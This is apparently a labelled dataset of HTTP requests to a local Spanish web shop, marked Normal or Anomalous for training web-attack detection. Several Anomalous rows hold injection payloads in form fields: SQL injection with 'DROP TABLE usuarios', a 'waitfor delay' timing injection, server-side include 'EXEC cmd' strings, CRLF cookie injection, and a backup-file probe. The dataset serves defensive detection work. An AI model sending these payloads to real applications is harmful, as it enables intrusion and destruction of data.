Label,HTTP_Request
Anomalous,"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=5FB7349F0526654C3304E87FB76EDDE9
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 5

idA=1"
Anomalous,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=68&B1=A%F1adir+al+carrito%253F HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=4B84DF2BA848C70F5A0F0CE77DB5D9DB
Connection: close"
Normal,"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=80D8B61FAB1F9C7BE7F2EF579DE48DF4
Connection: close"
Normal,"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=8B0414F09D58EA90316EFABCDD78CBD6
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 74

id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=18&B1=A%F1adir+al+carrito"
Anomalous,"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=0AE5285B2A5B076EFC99319B47206560
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 284

modo=registro&login=olivia&password=Pa-lTa&nombre=Clidanor&apellidos=Weffer+Vaamonde%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&email=dozier%40interanuncios.li&dni=58040403H&direccion=Vista+Alegre+90%2C+&ciudad=Copons&cp=43143&provincia=Valladolid&ntc=4437841608475479&B1=Registrar"
Normal,"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=EB206E6BE109A2282E5ADD602E8974CE
Connection: close"
Normal,"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=E083025C126CD3B09D7A3953018958C7
Connection: close"
Normal,"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=AC6F8F77BDA985A65E8E823AE43D4967
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 74

id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=84&B1=A%F1adir+al+carrito"
Normal,"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=F6347AA706EEFC15DCFB1674D31F266C
Connection: close"
Normal,"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=7CD7D949DD281E6ABC8B1CB81925C913
Connection: close"
Normal,"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=EA436BF059894AC9B28A676E475A717B
Connection: close"
Anomalous,"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=9F52B8F87003F78BB6563A218B99DB49
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 8

id=%257C"
Normal,"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=7DE9191A4ED84F6A61E1121E2FEA2BFE
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 4

id=1"
Normal,"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=4ED5EF12DDF924E361E38046698E5E06
Connection: close"
Anomalous,"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=DB1253A924C7DFAD088E2827BA770973
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 149

id=2&nombre=Jam%F3n+Ib%E9rico%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=43&B1=A%F1adir+al+carrito"
Anomalous,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=EF609DEA620F0CCAAB31CEAECE1B3B02
Connection: close"
Normal,"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=C90D3322381B20D176A5A4151181E6B5
Connection: close"
Anomalous,"GET http://localhost:8080/asf-logo-wide.gif HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=9B04C1FA257AD29CC0CB361C3E266A52
Connection: close"
Normal,"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=296AEC8AD4440D4FFD068FAF4FF6FD3A
Connection: close"
Normal,"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=E0A5CD09455F0FA4CFDA6A11ACB5A7C5
Connection: close"
Anomalous,"GET http://localhost:8080/tienda1/publico/carrito.jsp.BAK HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=DAF8C13D036B5C009FA2E5AAF0BA65A2
Connection: close"
Normal,"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=578FE05588CBBBA94587D68E22875228
Connection: close"
Normal,"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=68B4BF10D9544C2D7F6D1229695A7B20
Connection: close"
Anomalous,"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=CCCF49C0F3D3A6C24FA788DC15FBA8F7
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 104

modo=entrar&login=corace&pwd=ahorrAdOr&remember=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Entrar"
Normal,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=59&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=8101AF93831D45F7494C7165243A4C47
Connection: close"
Anomalous,"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=5A6605E6B8808FE59633C9AA80268D75
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 317

modo=registro&login=dimitrio&password=a30t0na8&nombre=Zelmar&apellidos=Manj%F3n+Montolio&email=lovelle.lorente%40ringringrent.asia&dni=19110618X&direccion=Alameda+Principal%2C+180+&ciudad=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=40291&provincia=Guip%FAzcoa&ntc=2985545355401012&B1=Registrar"
Normal,"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=49A0E4DFD9C9B3476F93BC68A9504FBB
Connection: close"
Normal,"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=530C8F274904A1B45B766D33CF976FA0
Connection: close"
Normal,"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=C37CD68D5F286265DB3D038C489B8135
Connection: close"
Normal,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=16&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=7B79BE1B0F53CA86EE15221F0C686EBB
Connection: close"
Anomalous,"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=CE6AD2942C478CD7A9126F192E5E5B78
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 308

modo=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=C%2F+Quasimodo+95+13%3FE&ciudad=Arbanc%F3n&cp=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Zamora&ntc=7990892411881647&B1=Registrar"
Anomalous,"POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=0B37AACB832BD490C3E8A2E2C46A557D
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 34

errorMsgA=Credenciales+incorrectas"
Normal,"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=C64AF28329FCC82D3D9C6E282D134842
Connection: close"
Anomalous,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=01EEFE9485C035C8474A870CA270B51A
Connection: close"
Anomalous,"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=8EA6763D3AD2D48B0648F0C1AFF26D58
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 76

id=3&nombre=Queso+Manchego%257C&precio=39&cantidad=53&B1=A%F1adir+al+carrito"
Anomalous,"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=1268FDD3103AA3F168138FE2FF1AB0BC
Content-Type: application/x-www-form-urlencoded
Connection: Connection: close
Content-length: Content-Length: 259

modo=registro&login=schenck6&password=oTorgADERa&nombre=Balbino&apellidos=Zapata+Pine%3F&email=falconetti%40normatic-vending.ar&dni=77359416C&direccion=Calle+Lope+De+Vega+19+&ciudad=Valle+de+Losa&cp=02270&provincia=Valladolid&ntc=2171024439369893&B1=Registrar"
Normal,"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=BE210A74DDB60A873EC01D7B00A991A4
Connection: close"
Normal,"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=54AD6C59C7F3F15FAFA99891530A9A07
Connection: close"
Anomalous,"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nettle&password=He%D1ir&nombre=Rad&apellidos=Zalarich+Llufriu&email=duarte%40ingenieriadelaconstruccion.vc&dni=47182191Z&direccion=Baza%2C+55%2C+&ciudad=Blecua+y+Torres&cp=43151&provincia=Granada&ntc=8375962445368254&B1A=Registrar HTTP/1.1 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Language: en
Host: localhost:8080
Cookie: JSESSIONID=3DE8C520664A4FDABB4B5DA66114CF99
Connection: close"
